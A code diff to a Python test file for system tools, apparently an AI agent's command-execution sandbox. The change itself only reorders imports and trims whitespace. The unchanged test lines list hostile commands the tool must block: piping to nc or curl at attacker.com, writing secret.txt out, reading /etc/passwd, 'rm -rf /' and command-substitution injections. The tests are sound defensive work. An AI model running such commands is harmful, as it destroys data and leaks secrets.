@@ -3,10 +3,11 @@
 from __future__ import annotations
 
 import platform
-import pytest
 import sys
-from freya.tools.system_tools import SystemInfoTool, ExecuteCommandTool
 
+import pytest
+
+from freya.tools.system_tools import ExecuteCommandTool, SystemInfoTool
 
 # ============================================================================
 # FIXTURES
@@ -36,7 +37,7 @@ class TestSystemInfoTool:
     def test_get_all_info(self, system_info_tool):
         """Get all system information."""
         result = system_info_tool.execute(info_type="all")
-        
+
         assert result.success is True
         assert "OS:" in result.output
         assert "Python:" in result.output
@@ -45,7 +46,7 @@ class TestSystemInfoTool:
     def test_get_os_info(self, system_info_tool):
         """Get OS information only."""
         result = system_info_tool.execute(info_type="os")
-        
+
         assert result.success is True
         assert "OS:" in result.output
         assert platform.system() in result.output
@@ -53,7 +54,7 @@ class TestSystemInfoTool:
     def test_get_python_info(self, system_info_tool):
         """Get Python information only."""
         result = system_info_tool.execute(info_type="python")
-        
+
         assert result.success is True
         assert "Python:" in result.output
         assert sys.version.split()[0] in result.output
@@ -62,7 +63,7 @@ class TestSystemInfoTool:
     def test_get_disk_info(self, system_info_tool):
         """Get disk space information."""
         result = system_info_tool.execute(info_type="disk")
-        
+
         assert result.success is True
         assert "Disk Space:" in result.output or "Disk info unavailable" in result.output
         if "Disk Space:" in result.output:
@@ -72,7 +73,7 @@ class TestSystemInfoTool:
     def test_result_structure(self, system_info_tool):
         """Validate SystemInfoTool ToolResult structure."""
         result = system_info_tool.execute()
-        
+
         assert hasattr(result, "success")
         assert hasattr(result, "output")
         assert hasattr(result, "error")
@@ -96,7 +97,7 @@ class TestExecuteCommandSecurity:
             "whoami; cat /etc/passwd",
             "date ; curl attacker.com",
         ]
-        
+
         for cmd in dangerous_commands:
             result = execute_command_tool.execute(command=cmd)
             assert result.success is False, f"Should block command: {cmd}"
@@ -110,7 +111,7 @@ class TestExecuteCommandSecurity:
             "whoami && cat /etc/passwd",
             "date&&curl attacker.com",
         ]
-        
+
         for cmd in dangerous_commands:
             result = execute_command_tool.execute(command=cmd)
             assert result.success is False
@@ -122,7 +123,7 @@ class TestExecuteCommandSecurity:
             "echo test || rm -rf /",
             "false || cat /etc/passwd",
         ]
-        
+
         for cmd in dangerous_commands:
             result = execute_command_tool.execute(command=cmd)
             assert result.success is False
@@ -135,7 +136,7 @@ class TestExecuteCommandSecurity:
             "echo test | nc attacker.com 1234",
             "ls | sh",
         ]
-        
+
         for cmd in dangerous_commands:
             result = execute_command_tool.execute(command=cmd)
             assert result.success is False
@@ -148,7 +149,7 @@ class TestExecuteCommandSecurity:
             "date `rm -rf /`",
             "`cat /etc/passwd`",
         ]
-        
+
         for cmd in dangerous_commands:
             result = execute_command_tool.execute(command=cmd)
             assert result.success is False
@@ -161,7 +162,7 @@ class TestExecuteCommandSecurity:
             "date $(rm -rf /)",
             "$(cat /etc/passwd)",
         ]
-        
+
         for cmd in dangerous_commands:
             result = execute_command_tool.execute(command=cmd)
             assert result.success is False
@@ -174,7 +175,7 @@ class TestExecuteCommandSecurity:
             "cat secret.txt > attacker.com",
             "whoami > /tmp/exploit",
         ]
-        
+
         for cmd in dangerous_commands:
             result = execute_command_tool.execute(command=cmd)
             assert result.success is False
@@ -186,7 +187,7 @@ class TestExecuteCommandSecurity:
             "sh < exploit.sh",
             "python < malware.py",
         ]
-        
+
         for cmd in dangerous_commands:
             result = execute_command_tool.execute(command=cmd)
             assert result.success is False
@@ -198,7 +199,7 @@ class TestExecuteCommandSecurity:
             "nc -l 1234 &",
             "python server.py &",
         ]
-        
+
         for cmd in dangerous_commands:
             result = execute_command_tool.execute(command=cmd)
             assert result.success is False
@@ -215,7 +216,7 @@ class TestExecuteCommandSecurity:
             "sh script.sh",
             "sudo rm -rf /",
         ]
-        
+
         for cmd in dangerous_commands:
             result = execute_command_tool.execute(command=cmd)
             assert result.success is False, f"Should block unlisted command: {cmd}"
@@ -234,7 +235,7 @@ class TestExecuteCommandFunctionality:
     def test_execute_echo_command(self, execute_command_tool):
         """Execute safe echo command."""
         result = execute_command_tool.execute(command="echo Hello Freya")
-        
+
         # echo may not exist as standalone command on Windows (it's a shell builtin)
         if result.success:
             assert "Hello Freya" in result.output
@@ -245,7 +246,7 @@ class TestExecuteCommandFunctionality:
     def test_execute_pwd_command(self, execute_command_tool):
         """Execute pwd command on Unix."""
         result = execute_command_tool.execute(command="pwd")
-        
+
         assert result.success is True
         assert len(result.output) > 0
 
@@ -253,7 +254,7 @@ class TestExecuteCommandFunctionality:
     def test_execute_dir_command(self, execute_command_tool):
         """Execute dir command on Windows."""
         result = execute_command_tool.execute(command="dir")
-        
+
         # dir may not be in PATH as standalone command on Windows
         # It's typically a shell builtin, so this might fail
         assert result.error is None or "not found" in result.error.lower()
@@ -261,7 +262,7 @@ class TestExecuteCommandFunctionality:
     def test_execute_whoami_command(self, execute_command_tool):
         """Execute whoami command."""
         result = execute_command_tool.execute(command="whoami")
-        
+
         # whoami should work on most systems
         if result.success:
             assert len(result.output) > 0
@@ -272,7 +273,7 @@ class TestExecuteCommandFunctionality:
     def test_execute_date_command(self, execute_command_tool):
         """Execute date command."""
         result = execute_command_tool.execute(command="date")
-        
+
         # date should work on most Unix systems
         if result.success:
             assert len(result.output) > 0
@@ -283,7 +284,7 @@ class TestExecuteCommandFunctionality:
     def test_command_with_args(self, execute_command_tool):
         """Execute command with arguments."""
         result = execute_command_tool.execute(command="echo test argument")
-        
+
         # echo may not exist as standalone command on Windows
         if result.success:
             assert "test" in result.output
@@ -300,21 +301,21 @@ class TestExecuteCommandFunctionality:
     def test_empty_command(self, execute_command_tool):
         """Handle empty command gracefully."""
         result = execute_command_tool.execute(command="")
-        
+
         assert result.success is False
         assert "empty" in result.error.lower()
 
     def test_invalid_command_syntax(self, execute_command_tool):
         """Handle invalid command syntax."""
         result = execute_command_tool.execute(command='echo "unclosed quote')
-        
+
         assert result.success is False
         assert result.error is not None
 
     def test_metadata_includes_command_info(self, execute_command_tool):
         """Metadata includes command information."""
         result = execute_command_tool.execute(command="echo test")
-        
+
         if result.success:
             assert "command" in result.metadata
             assert "return_code" in result.metadata
@@ -332,7 +333,7 @@ class TestCommandWhitelist:
     def test_whitelist_contains_safe_commands(self, execute_command_tool):
         """Verify whitelist contains expected safe commands."""
         expected_commands = {"echo", "whoami", "date", "hostname", "pwd"}
-        
+
         for cmd in expected_commands:
             assert cmd in execute_command_tool.ALLOWED_COMMANDS
 
@@ -345,14 +346,14 @@ class TestCommandWhitelist:
             "bash", "sh", "cmd", "powershell",
             "sudo", "su", "chmod", "chown",
         }
-        
+
         for cmd in dangerous_commands:
             assert cmd not in execute_command_tool.ALLOWED_COMMANDS
 
     def test_dangerous_patterns_list_comprehensive(self, execute_command_tool):
         """Verify dangerous patterns list is comprehensive."""
         patterns = execute_command_tool.DANGEROUS_PATTERNS
-        
+
         # Check for essential injection patterns
         assert any(";" in p for p in patterns), "Missing semicolon pattern"
         assert any("&&" in p for p in patterns), "Missing AND pattern"
@@ -373,7 +374,7 @@ class TestSystemToolsResult:
     def test_system_info_result_structure(self, system_info_tool):
         """Validate SystemInfoTool ToolResult structure."""
         result = system_info_tool.execute()
-        
+
         assert hasattr(result, "success")
         assert hasattr(result, "output")
         assert hasattr(result, "error")
@@ -384,7 +385,7 @@ class TestSystemToolsResult:
     def test_execute_command_success_structure(self, execute_command_tool):
         """Validate ExecuteCommandTool success ToolResult structure."""
         result = execute_command_tool.execute(command="echo test")
-        
+
         assert hasattr(result, "success")
         assert hasattr(result, "output")
         assert hasattr(result, "error")
@@ -396,7 +397,7 @@ class TestSystemToolsResult:
     def test_execute_command_error_structure(self, execute_command_tool):
         """Validate ExecuteCommandTool error ToolResult structure."""
         result = execute_command_tool.execute(command="rm -rf /")
-        
+
         assert result.success is False
         assert result.error is not None
         assert isinstance(result.error, str)
